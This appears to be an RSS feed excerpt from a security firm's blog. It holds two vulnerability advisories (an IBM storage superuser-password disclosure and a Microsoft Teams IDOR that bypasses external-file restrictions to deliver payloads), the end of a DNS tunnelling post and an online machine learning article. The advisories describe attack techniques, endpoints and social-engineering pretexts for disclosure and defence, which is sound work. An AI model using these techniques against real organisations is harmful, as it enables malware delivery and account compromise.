    &lt;img src=&#34;images/pic20.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After the rules are sorted, associate the rule group with a VPC that contains your application or VM, and it&amp;rsquo;s all done! The Lambda was no longer querying random DNS servers for arbitrary domains.&lt;/p&gt;
&lt;p&gt;I hope you&amp;rsquo;ve enjoyed this rather convoluted story about how an app test turned into me trying to implement a custom DNS tunnelling protocol not dissimilar to what you&amp;rsquo;d see on C2 frameworks, just minus the encryption, stealth and redundancy bits. And then we investigated some obscure functionality invented by AWS to add to your cloud bill and block the same thing twice.&lt;/p&gt;
&lt;p&gt;The client definitely found it a very cool story during our debrief and allowed me to publish it, so although we&amp;rsquo;re not gonna name names, thank you unnamed client! And thank you, the reader for making it to the end.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2023-43042 – IBM Backup Products Superuser Information Disclosure&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</link>
      <pubDate>Thu, 21 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; 8.3&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.ibm.com/support/pages/node/7064976&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.ibm.com/support/pages/node/7064976&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2023-43042&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 08/12/2023&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.0 Score:&lt;/strong&gt; 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Max Corbridge&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JUMPSEC’s Head of Adversarial Simulation (&lt;a href=&#34;https://twitter.com/CorbridgeMax&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@CorbridgeMax&lt;/a&gt;) discovered that an unauthenticated user can determine whether the default superuser password has been changed on IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products. These products were found to be a single point of failure for backup and disaster recovery processes within client environments, and as such are highly critical systems. &lt;/p&gt;
&lt;p&gt;This only affects the 8.3.1 release as it is impossible for the default password to still be configured on an active system running later releases, since the user must change this either as part of first time setup or prior to upgrading from 8.3.1 or earlier. However, IBM has removed the ability to query this status from all releases listed in the Mitigation section of this advisory.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IBM web servers related to backup/storage products respond to unauthenticated GET requests to the &lt;em&gt;/login&lt;/em&gt; page with the name of the superuser account and if the default password has been changed or not. This could allow unauthenticated attackers on the network with the necessary information to compromise what is often a business-critical asset, with superuser permissions. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 
Cache-Control: no-cache, no-store, must-revalidate
Strict-Transport-Security: max-age=778000; includeSubDomains
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer-when-downgrade
Pragma: no-cache
X-Content-Type-Options: nosniff
SET-COOKIE: JSESSIONID=[REDACTED];Path=/;Secure;SameSite=Lax
SET-COOKIE: _sync=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _redirect=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _sync=[REDACTED]; HttpOnly; Secure
X-FRAME-OPTIONS: DENY
Cache-Control: post-check=0, pre-check=0
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Fri, 08 Sep 2023 12:28:27 GMT
Connection: close
Content-Length: 70858



&amp;lt;!DOCTYPE html&amp;gt;

&amp;lt;html&amp;gt;
[SNIPPED_FOR_BREVITY]
&amp;#34;superuserPasswordChanged&amp;#34;:true,&amp;#34;hasEnvironmentals&amp;#34;:true,
[SNIPPED_FOR_BREVITY]
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;Figure 1: HTTP Response from IBM FlashSystem Webserver&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As a priority, change the superuser password if it is still set to the default.&lt;/p&gt;
&lt;p&gt;IBM also recommends that you fix this vulnerability by upgrading affected versions of IBM SAN Volume Controller, IBM Storwize V7000, IBM Storwize V5000 and V5100, IBM Storwize V5000E, IBM Spectrum Virtualize Software, IBM Spectrum Virtualize for Public Cloud, IBM FlashSystem V9000, IBM FlashSystem 9500, IBM FlashSystem 9100 Family, IBM FlashSystem 9200, IBM FlashSystem 7300, IBM FlashSystem 7200, IBM FlashSystem 5200 and IBM FlashSystem 5000 to the following code levels or higher:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.2.0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.0.2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.5.0.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.4.0.12&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.3.1.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Please note that it is necessary to change the superuser password before upgrading from 8.3.1 to 8.4.0 or later, which is the reason why this upgrade remediates the vulnerability.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;08/09/2023: Vulnerability submitted through IBM’s Vulnerability Disclosure Program&lt;/p&gt;
&lt;p&gt;13/12/2023: Vulnerability remediated and public notice created by IBM.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory: IDOR in Microsoft Teams Allows for External Tenants to Introduce Malware</title>
      <link>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</link>
      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</guid>
      <description>
        
        
        &lt;h3&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tldr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tldr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Max Corbridge (@CorbridgeMax) and Tom Ellson (@tde_sec) of JUMPSEC’s Red Team recently discovered a vulnerability in the latest version of Microsoft Teams which allows for the possible introduction of malware into any organisations using Microsoft Teams in its default configuration. This is done by bypassing client-side security controls which prevent external tenants from sending files (malware in this case) to staff in your organisation. JUMPSEC has detailed remediation options, as well as some detection opportunities. &lt;/p&gt;
&lt;h3&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Introducing malware into target organisations is becoming increasingly difficult. Many of the traditional payload types (.exe, Office Macros, etc) are now heavily-scrutinised or have been proactively addressed to reduce their &lt;a href=&#34;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;efficacy&lt;/em&gt;&lt;/a&gt;. Similarly, payload delivery avenues such as phishing are becoming increasingly monitored and secured to reduce the ease with which threat actors’ malware can reach end-user devices. Mail security controls, IP blocklists, domain reputation, email HTML, content inspection, third-party mail security products, URL filtering and many more must be bypassed for a phishing campaign to traverse all anti-phishing security controls and land in a target’s inbox. &lt;/p&gt;
&lt;p&gt;As such, threat actors and red teams alike are looking for newer and potentially overlooked avenues of payload delivery. One such novel avenue is Microsoft Teams External Tenants. Organisations that use Microsoft Teams (91% of the Fortune 100 according to &lt;a href=&#34;https://www.linkedin.com/pulse/91-fortune-100-companies-use-teams-techbanditshack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;this article&lt;/em&gt;&lt;/a&gt;) inherit Microsoft’s default configuration which allows users from outside of their organisation to reach out to their staff members. By allowing this, an entirely new avenue of social engineering (and now payload delivery as this blog will explain) is created.&lt;/p&gt;
&lt;h3&gt;Detail&lt;span class=&#34;absolute -mt-20&#34; id=&#34;detail&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#detail&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Microsoft Teams allows any user with a Microsoft account to reach out to ‘external tenancies’. Here, external tenancies can be thought of as any business or organisation using Microsoft Teams. These organisations each have their own Microsoft tenancy, and users from one tenancy are able to send messages to users in another tenancy. When doing so, an ‘External’ banner appears alongside the name as seen below. &lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19671&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;391&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/external.png&#34; title=&#34;External banner on incoming message&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;External banner on incoming message&lt;/figcaption&gt;
  &lt;/figure&gt; External banner applied to incoming message requests[/caption]&lt;/p&gt;
&lt;p&gt;As someone who spent a long time doing purely social engineering (phishing, vishing, smshing, etc.) this is not a show stopper by any means. In my experience, whilst this banner (and the subsequent pop-up) may deter a handful of targets, there is still a significant percentage of staff that would click on a message from an external tenant and accept the subsequent warning that the user is ‘external’. In fact, this was proven only last month, as the techniques used in this blog post were successfully used to gain an initial foothold in a client’s environment as part of a red team engagement. This is especially true if the malicious party is impersonating a known member of your organisation, and has purchased and registered a brand-impersonation domain as red teams often do.&lt;/p&gt;
&lt;p&gt;When messaging staff in another organisation you are blocked from sending files to them, unlike with members of your own tenancy. See below the difference:&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19672&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1496&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;Messaging a member of the same organisation&#34; alt=&#34;Messaging a member of the same organisation &#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Messaging a member of the same organisation&lt;/figcaption&gt;
  &lt;/figure&gt; Messaging a member of the same organisation[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19673&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1421&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/2.png&#34; title=&#34;Restrictions when messaging someone in a different organisation&#34; alt=&#34;Restrictions when messaging someone in a different organisation&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Restrictions when messaging someone in a different organisation&lt;/figcaption&gt;
  &lt;/figure&gt; Restrictions when messaging someone in a different organisation[/caption]&lt;/p&gt;
&lt;p&gt;So far, this is nothing new. However, having leveraged this social engineering avenue in the past I began wondering if this security control could be bypassed to allow for seamless delivery of payloads directly into a target&amp;rsquo;s inbox on our red team engagements. I began looking online, and articles &lt;a href=&#34;https://aadinternals.com/post/teams-policies/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;like this&lt;/em&gt;&lt;/a&gt; suggested that certain security controls are actually implemented client-side in Microsoft Teams.&lt;/p&gt;
&lt;p&gt;I raised this with JUMPSEC’s Head of Offensive Security (Tom Ellson) and no more than 10 minutes later we had bypassed the security control and were able to send files into a target organisation. Exploitation of the vulnerability was straightforward using a traditional IDOR technique of switching the internal and external recipient ID on the POST request, usually here:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;/v1/users/ME/conversations/&amp;lt;RECIPIENT_ID&amp;gt;/messages &lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19674&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1429&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/3.png&#34; title=&#34;3&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;3&lt;/figcaption&gt;
  &lt;/figure&gt; Payload delivered directly into a target inbox[/caption]&lt;/p&gt;
&lt;p&gt;When sending the payload like this, it is actually hosted on a Sharepoint domain and the target downloads it from there. It appears, however, in the target inbox as a file, not a link. &lt;/p&gt;
&lt;p&gt;Having identified the issue, I wanted to validate that this vulnerability would work as intended as an avenue for payload delivery into a target organisation, and not fall short for some unknown reason when used in a mature client environment. As such, last month I used this vulnerability to deliver our red team C2 (malware) payload directly into a target inbox to gain our initial foothold on a covert red team engagement. This allowed for a much more simple, reliable, and user-friendly payload delivery avenue than traditional phishing journeys. &lt;/p&gt;
&lt;h3&gt;Why is this a big deal?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;why-is-this-a-big-deal&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#why-is-this-a-big-deal&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The true reason I see this to be a potentially lucrative avenue for threat actors to deliver payloads is the fact that this bypasses nearly all modern anti-phishing security controls mentioned in the introduction of this advisory. &lt;/p&gt;
&lt;p&gt;Firstly, it is very straightforward to buy a domain similar to your target organisations and register it with M365. It avoids the need to use mature domains, with web servers, landing pages, CAPTCHAs, domain categorisation, and URL filtering. This is a huge time saver, as this can cost several days or more on a red team engagement when setting up the various bits of infrastructure needed for a convincing phishing campaign. &lt;/p&gt;
&lt;p&gt;Secondly, it avoids the now-rightfully-dangerous act of clicking on a link in an email, something that staff have been trained to avoid for years now, greatly reducing the likelihood of a typical staff member detecting this as a phishing attack. The payload will now be served by a trusted Sharepoint domain, and will arrive in the form of a file in a target’s Teams inbox. As such, the payload inherits the trust reputation of Sharepoint, not a malicious phishing website.&lt;/p&gt;
&lt;p&gt;Finally, when this vulnerability is combined with social engineering via Teams it becomes very easy to start a back-and-forth conversation, jump on a call, share screens, and more. By comparison, it makes social engineering via email feel very stagnant, and stop-start. When using this on a real engagement the pretext of an IT technician was used to ask the target if they could jump on a call to update some critical software. Once on the call this vulnerability was leveraged to deliver a payload and, when combined with a full social engineering attack, was implicitly trusted by the target. &lt;/p&gt;
&lt;h3&gt;Impact&lt;span class=&#34;absolute -mt-20&#34; id=&#34;impact&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#impact&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability affects every organisation using Teams in the default configuration. As such it has huge potential reach, and could be leveraged by threat actors to bypass many traditional payload delivery security controls. Having now proven this hypothesis, and used this vulnerability to successfully deliver malware that compromised a target machine in a client&amp;rsquo;s environment, I feel this has been successfully demonstrated as an exploitable finding.&lt;/p&gt;
&lt;h3&gt;Remediation and Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;remediation-and-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#remediation-and-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability was reported to Microsoft, who validated that the vulnerability is legitimate, but said that it ‘did not meet the bar for immediate servicing’. I think this is a shame, but was nonetheless expected. As such, JUMPSEC has added this section to help organisations who might be concerned about the above findings. &lt;/p&gt;
&lt;p&gt;Firstly, I urge you to review if there is a business requirement for external tenants to have permission to message your staff in the first place. Of course, many businesses do legitimately require communication with other organisations, service providers, and more. That is not the case, however, for all businesses that use Teams. If you are not currently using Teams for regular communication with external tenants, tighten up your security controls and remove the option altogether. This can be done in Microsoft Teams Admin Center &amp;gt; External Access.&lt;/p&gt;
&lt;p&gt;If you do require communication with external tenants, but there are only a handful of organisations that you regularly communicate with, then you can change the security settings to only allow communication with certain allow-listed domains. This would be a good middle ground for shutting down this attack path, without affecting your business operations. This can be done in Microsoft Teams Admin Center &amp;gt; External Access. &lt;/p&gt;
&lt;p&gt;If either of the above will not work in your unique business case you have a few options. Firstly, endeavour to educate staff on the possibility of productivity apps such as Teams, Slack, Sharepoint, etc, for launching social engineering campaigns. It is not just email that is being abused any more, and yet it seems, in my personal opinion, that when using alternative avenues to email there is an inherent trust, due to the rich history connecting phishing and emails. &lt;/p&gt;
&lt;p&gt;Regarding detections, there is currently limited support from Microsoft. Whilst there are plenty of Teams logs (see here for a full list &lt;a href=&#34;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&lt;/a&gt;) these do not currently cover the crucial ‘External Tenants Messaging your Staff’, or even better ‘Staff Member Accepts Message Request from External Tenant’. The latter would be preferable, as it would eliminate alerts from previously-known external tenants (your service providers, etc) and focus just on new message requests. I have reached out to Microsoft to attempt to turn on these logs so that they can be monitored in line with the increased usage of Teams for social engineering. If you agree that this should be made available, then please give the feature request a thumbs up (&lt;a href=&#34;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;Whilst not a perfect solution, it would be possible to use web proxy logs to alert on, or more likely gain some baseline visibility into, staff members accepting external message requests. In EMEA, when a Teams user accepts a message request from an external tenant it sends a POST request to a unique URI which you can monitor:&lt;/p&gt;
&lt;p&gt;/api/mt/emea/beta/userSettings/acceptlist/manage&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19675&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;947&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/request_clean.png&#34; title=&#34;request clean&#34; alt=&#34;request clean&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;request clean&lt;/figcaption&gt;
  &lt;/figure&gt; URI for accepting external message requests[/caption]&lt;/p&gt;
&lt;p&gt;The difficulty, at present, is turning this into a useful piece of telemetry with usernames, and the message in question. Monitoring this will, however, give you an idea of how common this transaction is in your estate, and allow you to potentially implement some of the mitigation factors mentioned above with a more educated understanding. &lt;/p&gt;
&lt;h3&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As a Red Teamer regularly tasked with achieving an initial foothold in a target organisation, I have a unique appreciation and concern for the above-mentioned finding. With over 270 million active monthly users, Teams is incredibly common in target organisations. JUMPSEC’s Detection and Response Team (DART) have seen a trend towards novel phishing and payload delivery techniques leveraged in the wild, including but not limited to using Teams external tenancies for social engineering. With threat actors continually experimenting with new social engineering attacks, organisations are having to expand their security awareness to cover previously-overlooked frontiers.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Online Machine Learning: how to integrate user feedback</title>
      <link>//localhost:1313/articles/2022/12/2022-12-12-online-machine-learning-how-to-integrate-user-feedback/</link>
      <pubDate>Mon, 12 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/12/2022-12-12-online-machine-learning-how-to-integrate-user-feedback/</guid>
      <description>
        
        
        &lt;p&gt;When designing and implementing a machine learning model, ensuring it is continually updated is a challenge that all engineers encounter. &lt;/p&gt;
&lt;p&gt;In this article, I explore the online machine learning technique that I used during a project and present how it was implemented for effective results.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Choosing a machine learning method&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;choosing-a-machine-learning-method&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#choosing-a-machine-learning-method&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Machine learning solutions can be mainly split into offline and online methods. &lt;strong&gt;Online&lt;/strong&gt; machine learning is a method in which data becomes available in a sequential order and is used to update the best predictor for future data at each step, as opposed to batch learning techniques which generate the best predictor by learning on the entire training data set at once. &lt;/p&gt;
&lt;p&gt;From this concept, the core components are the &lt;strong&gt;data in a sequential order&lt;/strong&gt; and &lt;strong&gt;updating at each step&lt;/strong&gt;. Online machine learning is necessary is based on the following reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Detection models need to be updated instantly, within a relatively short time&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Computation and storage costs need to be minimised for a large dataset&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;New types of patterns need to be integrated quickly&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;strong&gt;Using Apache Airflow&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;using-apache-airflow&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#using-apache-airflow&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;It’s important to have a solid UI to manage the pipelines so I can easily review the chain of pipelines. After much research, I found many engineers recommended Apache Airflow. &lt;/p&gt;
&lt;p&gt;Some of the core concepts for Airflow are described below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Directed Acyclic Graph (DAG)&lt;/strong&gt; – is a collection of all the tasks you want to run, organised in a way that reflects their relationships and dependencies.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Scheduler and Interval&lt;/strong&gt; - The Airflow scheduler monitors all tasks and DAGs, then triggers the task instances once their dependencies are complete. And the interval is used to set up the time period to rerun for a dag.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While using Airflow, we encountered two key challenges: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;No default option exists for user feedback to be provided based on the prediction result. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;It is vital that storage requirements are kept to a manageable level, and that the task can be completed quickly enough to enable the business process to function on-time.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;strong&gt;How we structure different datasets&lt;/strong&gt;:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-we-structure-different-datasets&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-we-structure-different-datasets&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to split train and update processes, we separate training, testing, and updating. The update folder is what we use to provide corrected predictions with csv format. The format is depicted as following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Picture.png&#34; alt=&#34;Pred and Corr&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Png1: pred and corr&lt;/p&gt;
&lt;p&gt;The 1 in path_pred is the anomaly prediction. The path_corr is copied initially from path_pred and then corrected by the analyst.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;How to achieve online learning in Airflow&lt;/strong&gt;:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-to-achieve-online-learning-in-airflow&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-to-achieve-online-learning-in-airflow&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to overcome the drawback without interactive mode in Airflow, I had to implement a custom offline solution. Thanks to the powerful automation of Airflow, I just need to set a location and input the corrected prediction result there. Then, the Airflow will read the data from the specific location as an update DAG.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Practicality and speed considerations in online learning&lt;/strong&gt;:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;practicality-and-speed-considerations-in-online-learning&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#practicality-and-speed-considerations-in-online-learning&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As we solved the online machine learning part, we now face the problem about time consumption, and storage. &lt;/p&gt;
&lt;p&gt;As for time consumption, the prediction is made within every interval. The data is sent to the update folder to await reading by DAGs.  Every prediction with the timestamp as the filename can be treated as one batch. Instead of reading and extracting the whole batch of data, I chose only the wrong prediction (after correction) and subsequently extracted the sequence (use LSTM model) from that row in csv. &lt;/p&gt;
&lt;p&gt;seq_array = df.query(&amp;ldquo;path_pred==&amp;lsquo;1&amp;rsquo; &amp;amp; path_corr in [0,&amp;lsquo;0&amp;rsquo;]&amp;rdquo;)[&amp;lsquo;seq_path&amp;rsquo;].values&lt;/p&gt;
&lt;p&gt;Png2: read single prediction sequence&lt;/p&gt;
&lt;p&gt;After splitting the sequences into multiple X and Y (number is less than the total data in a batch), I trained the model based on the chosen data, attempting to integrate the right prediction with certain attempts. &lt;/p&gt;
